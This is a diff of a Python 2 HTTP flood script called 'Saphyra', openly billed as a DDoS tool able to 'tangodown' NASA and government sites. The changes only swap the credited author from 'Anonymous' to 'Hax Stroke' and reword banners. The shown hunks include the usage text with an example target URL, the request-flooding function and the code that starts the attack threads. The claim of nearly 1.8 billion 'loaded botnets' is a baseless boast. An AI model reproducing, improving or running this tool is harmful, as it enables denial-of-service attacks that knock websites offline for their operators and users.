@@ -1,11 +1,11 @@
 # ----------------------------------------------------------------------------------------------
-# Saphyra - DDoS Tool
+# Saphyra - iDDoS Priv8 Tool
 #
-# The DDoS Protocol is the most massive type of attack
+# The iDDoS Protocol is the most massive type of attack
 # This tool can tangodown nasa and more gov websites
 # 
 #
-# author : Anonymous , version 1.0
+# author : Hax Stroke , version 1.0
 # ----------------------------------------------------------------------------------------------
 import urllib2
 import sys
@@ -3409,7 +3409,7 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print 'Saphyra DDoS Tool ( individual Dangerous Denial of Service )'
+	print 'Saphyra Priv8 Hax Stroke iDDoS Tool ( individual Dangerous Denial of Service )'
 	print 'New loaded Botnets: 1,798,445,657'
 	print 'Usage: Saphyra (url)'
 	print 'Example: Saphyra.py http://luthi.co.il/'
@@ -3445,7 +3445,7 @@ ___<__(|) _   **-/  / /   /
      /  |,'   /  
     :   /    /
     [  /   ,'     ~>Saphyra DDoS Tool<~
-    | /  ,'      ~~>Created By Anonymous<~~
+    | /  ,'      ~~>Created By Hax Stroke<~~
     |/,-'
     '
                                                        
@@ -3474,7 +3474,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print "----->>> ! We are Anonymous - ExpectUS ! <<<-----"
+			print "----->>> Saphyra attack started Sended <<<-----"
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -3515,8 +3515,8 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Starting the Attack"
-		print "ANONYMOUS"
+		print "Starting the Saphyra shotings in webserver Hyper Massive Revolt DDoS Tool"
+		print "Created By Hax Stroke"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
@@ -3530,5 +3530,3 @@ else:
 			t.start()
 		t = MonitorThread()
 		t.start()
-
-	
